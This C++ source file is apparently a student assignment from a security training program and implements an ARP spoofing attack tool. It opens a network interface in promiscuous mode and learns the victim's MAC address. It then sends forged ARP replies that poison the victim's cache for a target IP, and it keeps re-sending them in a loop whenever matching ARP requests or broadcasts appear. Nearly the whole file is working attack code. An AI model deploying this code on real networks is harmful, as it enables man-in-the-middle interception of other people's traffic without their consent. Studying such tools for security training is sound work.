#include <list>
#include <iostream>
#include "send_arp.h"

void usage() {
  printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

struct session {
    u_char sender_ip[4];
    u_char target_ip[4];
    u_char sender_mac[6];
    ARPpacket arp_attack_packet;
};

void arp_spoofing(){

}

int main(int argc, char* argv[]) {
  char track[] = "취약점"; // "개발", "컨설팅", "포렌식"
  char name[] = "권재승";

  if (argc < 4 && argc%2 == 1) {
    printf("[bob8][%s]arp_send[%s]\n\n", track, name);
    usage();
    return -1;
  }
  char errbuf[PCAP_ERRBUF_SIZE];
  char* dev = argv[1];
  u_char my_ip[4];
  u_char my_mac[6]={0};
  getMyIpAddress(dev, my_ip);
  getMacAddress(my_mac, dev);

  /*
   * interface : dev(eth0)
   * BUFSIZE : 65536 ?
   * PCAP_OPENFLAG_PROMISCUOUS : 1 / promiscuous mode
   * timeout milisecond
   * errbuf
  */
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);    // linux pcap_open
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  std::list<session> sessionList;

  for(int i=2; i<argc; i+=2){
      session sess;
      parsing_string2ip(sess.sender_ip, argv[i]);
      parsing_string2ip(sess.target_ip, argv[i+1]);

      // find Sender_ip MAC address
      ARPpacket arp_packet;
      make_arp_request(&arp_packet, my_mac, my_ip, sess.sender_ip);
      findMacAddress(handle, &arp_packet, sess.sender_mac);

      // Attack ARP Spoofing
      make_arp_reply(&sess.arp_attack_packet, my_mac, my_ip, sess.sender_mac, sess.sender_ip, sess.target_ip);
      pcap_sendpacket(handle,(const u_char*)&sess.arp_attack_packet,60);
      sessionList.push_back(sess);
  }

  u_char arp_packet[1024];
  std::list<session>::iterator iter;
  bool broadcast = false;
  int cnt = 0;
  while(true){
    next_arp_reqPcap(handle, arp_packet);
    const ARPHeader* arp_header = reinterpret_cast<const ARPHeader*>(arp_packet);
    for (iter = sessionList.begin(); iter != sessionList.end(); ++iter){
        if(!memcmp(arp_header->sender_ip, iter->sender_ip, 4) && !memcmp(arp_header->target_ip, iter->target_ip, 4)){
            printf("ARP req : ");
            printf("Who has "); print_ip(iter->target_ip); printf("? ");
            printf("Tell "); print_ip(iter->sender_ip); printf("\n");
            pcap_sendpacket(handle,(const u_char*)&iter->arp_attack_packet,60);
            if(!memcmp(arp_header->target_mac, "\x00\x00\x00\x00\x00\x00", 6)){
                printf("broadcast!! : ");
                pcap_sendpacket(handle,(const u_char*)&iter->arp_attack_packet,60);
                broadcast = true;
            }
        }
    }
    printf("cnt : %d\n",cnt);
    cnt++;
    if(broadcast && (cnt%8==0)){
        for (iter = sessionList.begin(); iter != sessionList.end(); ++iter)
            pcap_sendpacket(handle,(const u_char*)&iter->arp_attack_packet,60);
        broadcast = false;
        if(cnt%8==0)
            cnt = 0;
    }
  }

  pcap_close(handle);
  return 0;
}
